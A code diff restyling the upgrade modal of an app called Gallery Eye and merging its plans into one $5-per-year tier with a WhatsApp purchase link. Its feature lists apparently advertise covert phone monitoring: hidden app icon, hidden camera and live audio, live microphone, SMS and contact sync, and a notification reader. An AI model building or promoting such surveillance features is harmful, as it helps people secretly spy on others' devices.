@@ -1,175 +1,77 @@
-﻿"use client";
+"use client";
+
+import { Zap, Check } from 'lucide-react';
 
 interface UpgradeModalProps {
     isOpen: boolean;
     onClose: () => void;
     feature: string;
-    requiredPlan: 'standard' | 'premium';
+    requiredPlan: 'standard';
 }
 
-const planConfig = {
-    standard: {
-        label: 'Standard',
-        accent: '#10b981',
-        accentDim: 'rgba(16,185,129,0.12)',
-        accentBorder: 'rgba(16,185,129,0.30)',
-        icon: (
-            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-                <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z" />
-            </svg>
-        ),
-        features: [
-            '100 Photos + 50 Videos sync',
-            'SMS & Contacts access',
-            'Flashlight & vibration control',
-            'Hide app icon',
-            'Up to 7 devices',
-        ],
-    },
-    premium: {
-        label: 'Premium',
-        accent: '#f59e0b',
-        accentDim: 'rgba(245,158,11,0.12)',
-        accentBorder: 'rgba(245,158,11,0.30)',
-        icon: (
-            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-                <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z" />
-            </svg>
-        ),
-        features: [
-            'Unlimited photos & videos',
-            'All Standard features',
-            'Bulk folder download (ZIP)',
-            'Hidden camera & live audio',
-            'Priority support',
-        ],
-    },
-};
+const FEATURES = [
+    'Unlimited Photos & Videos',
+    'Camera & Live Microphone',
+    'SMS & Contacts Sync',
+    'Notification Reader',
+    'ZIP & Bulk Download',
+    'All Tools Unlocked',
+    'Up to 10 Devices',
+];
 
-export default function UpgradeModal({ isOpen, onClose, feature, requiredPlan }: UpgradeModalProps) {
+export default function UpgradeModal({ isOpen, onClose, feature }: UpgradeModalProps) {
     if (!isOpen) return null;
-    const plan = planConfig[requiredPlan];
 
     return (
         <div
-            className="animate-fadeIn"
-            style={{
-                position: 'fixed', inset: 0, zIndex: 'var(--z-modal)' as any,
-                display: 'flex', alignItems: 'center', justifyContent: 'center',
-                background: 'rgba(6,11,26,0.82)', backdropFilter: 'blur(12px)',
-                WebkitBackdropFilter: 'blur(12px)', padding: '1rem',
-            }}
+            className="fixed inset-0 z-[700] flex items-center justify-center bg-black/80 backdrop-blur-md p-4 animate-fadeIn"
             onClick={onClose}
         >
             <div
-                className="animate-scaleIn"
+                className="w-full max-w-sm bg-[#131417] border border-emerald-500/20 rounded-3xl overflow-hidden shadow-2xl animate-scaleIn"
                 onClick={e => e.stopPropagation()}
-                style={{
-                    width: '100%', maxWidth: 400,
-                    background: 'var(--bg-surface)',
-                    border: '1px solid var(--border-normal)',
-                    borderRadius: '1.5rem',
-                    overflow: 'hidden',
-                    boxShadow: 'var(--shadow-lg)',
-                }}
             >
-                {/* Accent header strip */}
-                <div style={{
-                    padding: '1.5rem', textAlign: 'center',
-                    background: plan.accentDim,
-                    borderBottom: `1px solid ${plan.accentBorder}`,
-                }}>
-                    <div style={{
-                        width: 56, height: 56, borderRadius: '1rem', margin: '0 auto 1rem',
-                        background: plan.accentDim,
-                        border: `1px solid ${plan.accentBorder}`,
-                        display: 'flex', alignItems: 'center', justifyContent: 'center',
-                        color: plan.accent,
-                    }}>
-                        {plan.icon}
+                <div className="p-6 text-center bg-emerald-500/5 border-b border-emerald-500/10 relative overflow-hidden">
+                    <div className="absolute top-0 left-1/2 -translate-x-1/2 w-40 h-40 bg-emerald-500/10 rounded-full blur-3xl -translate-y-1/2 pointer-events-none" />
+                    <div className="w-14 h-14 rounded-2xl bg-emerald-500/15 border border-emerald-500/25 flex items-center justify-center mx-auto mb-4 shadow-[0_0_20px_rgba(16,185,129,0.15)] relative">
+                        <Zap size={24} className="text-emerald-400" />
                     </div>
-                    <div style={{
-                        fontFamily: "'Space Grotesk', monospace",
-                        fontSize: '0.625rem', fontWeight: 700, letterSpacing: '0.12em',
-                        textTransform: 'uppercase', color: plan.accent, marginBottom: '0.375rem',
-                    }}>
-                        {plan.label} required
-                    </div>
-                    <h2 style={{
-                        fontWeight: 700, fontSize: '1.25rem', letterSpacing: '-0.02em',
-                        color: 'var(--text-primary)',
-                    }}>
-                        {feature}
-                    </h2>
-                    <p style={{ color: 'var(--text-secondary)', fontSize: '0.8125rem', marginTop: '0.375rem' }}>
-                        Upgrade to unlock this feature
-                    </p>
+                    <p className="text-[10px] font-black tracking-[0.15em] uppercase text-emerald-400 mb-1">Standard Plan Required</p>
+                    <h2 className="text-lg font-bold text-white tracking-tight">{feature}</h2>
+                    <p className="text-xs text-white/40 mt-1">Upgrade to unlock this feature</p>
                 </div>
 
-                <div style={{ padding: '1.25rem' }}>
-                    {/* Feature list */}
-                    <div style={{
-                        background: 'var(--bg-elevated)',
-                        border: '1px solid var(--border-subtle)',
-                        borderRadius: '0.875rem', padding: '1rem',
-                        marginBottom: '1.25rem',
-                    }}>
-                        <p style={{
-                            fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-muted)',
-                            textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: '0.75rem',
-                        }}>
-                            {plan.label} includes
-                        </p>
-                        <ul style={{ display: 'flex', flexDirection: 'column', gap: '0.5rem' }}>
-                            {plan.features.map((f, i) => (
-                                <li key={i} style={{ display: 'flex', alignItems: 'center', gap: '0.625rem' }}>
-                                    <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
-                                        <circle cx="7" cy="7" r="6.5" stroke={plan.accent} strokeOpacity="0.4" />
-                                        <path d="M4.5 7l2 2 3-3" stroke={plan.accent} strokeWidth="1.4" strokeLinecap="round" strokeLinejoin="round" />
-                                    </svg>
-                                    <span style={{ color: 'var(--text-secondary)', fontSize: '0.8125rem' }}>{f}</span>
-                                </li>
+                <div className="p-5">
+                    <div className="bg-white/[0.03] border border-white/5 rounded-2xl p-4 mb-5">
+                        <p className="text-[10px] font-bold tracking-widest uppercase text-white/30 mb-3">Standard includes</p>
+                        <div className="space-y-2.5">
+                            {FEATURES.map((f, i) => (
+                                <div key={i} className="flex items-center gap-2.5">
+                                    <Check size={13} className="text-emerald-400 flex-shrink-0" />
+                                    <span className="text-xs text-white/60">{f}</span>
+                                </div>
                             ))}
-                        </ul>
+                        </div>
+                        <div className="mt-4 pt-3 border-t border-white/5 flex items-baseline gap-1">
+                            <span className="text-xl font-black text-white">$5</span>
+                            <span className="text-xs text-white/30">/ year</span>
+                        </div>
                     </div>
 
-                    {/* Buttons */}
-                    <div style={{ display: 'flex', gap: '0.625rem' }}>
+                    <div className="flex gap-3">
                         <button
                             onClick={onClose}
-                            style={{
-                                flex: 1, padding: '0.75rem',
-                                background: 'var(--bg-elevated)',
-                                border: '1px solid var(--border-normal)',
-                                borderRadius: '0.875rem', color: 'var(--text-secondary)',
-                                fontFamily: "'Plus Jakarta Sans', sans-serif", fontWeight: 600, fontSize: '0.875rem',
-                                cursor: 'pointer', transition: 'background 0.2s cubic-bezier(0.32,0.72,0,1)',
-                            }}
-                            onMouseEnter={e => (e.currentTarget.style.background = 'var(--bg-overlay)')}
-                            onMouseLeave={e => (e.currentTarget.style.background = 'var(--bg-elevated)')}
+                            className="flex-1 py-3 rounded-xl bg-white/5 border border-white/10 text-sm font-semibold text-white/50 hover:text-white hover:bg-white/10 transition-all"
                         >
                             Not now
                         </button>
                         <a
-                            href={`https://wa.me/923177407478?text=I%20want%20to%20upgrade%20to%20${plan.label}%20plan%20for%20GalleryEye`}
+                            href={`https://wa.me/923460257488?text=${encodeURIComponent('⚡ *Upgrade Request*\n\nI want to upgrade to the Standard plan ($5/year) for Gallery Eye.\n\nPlease process my request! 🙏')}`}
                             target="_blank"
                             rel="noopener noreferrer"
-                            style={{
-                                flex: 1, padding: '0.75rem',
-                                background: plan.accent, color: plan.accent === '#10b981' ? '#09090b' : '#fff',
-                                fontFamily: "'Plus Jakarta Sans', sans-serif", fontWeight: 600, fontSize: '0.875rem',
-                                borderRadius: '0.875rem', border: 'none', cursor: 'pointer',
-                                display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '0.375rem',
-                                textDecoration: 'none',
-                                transition: 'transform 0.2s cubic-bezier(0.32,0.72,0,1), opacity 0.2s',
-                            }}
-                            onMouseEnter={e => (e.currentTarget.style.opacity = '0.88')}
-                            onMouseLeave={e => (e.currentTarget.style.opacity = '1')}
+                            className="flex-1 py-3 rounded-xl bg-emerald-500 hover:bg-emerald-600 text-sm font-bold text-white text-center transition-all shadow-[0_0_20px_rgba(16,185,129,0.3)] hover:shadow-[0_0_30px_rgba(16,185,129,0.5)] flex items-center justify-center gap-2"
                         >
-                            Upgrade now
-                            <svg width="13" height="13" viewBox="0 0 13 13" fill="none">
-                                <path d="M2 6.5h9M8 3.5l3 3-3 3" stroke="#fff" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
-                            </svg>
+                            <Zap size={14} /> Upgrade
                         </a>
                     </div>
                 </div>
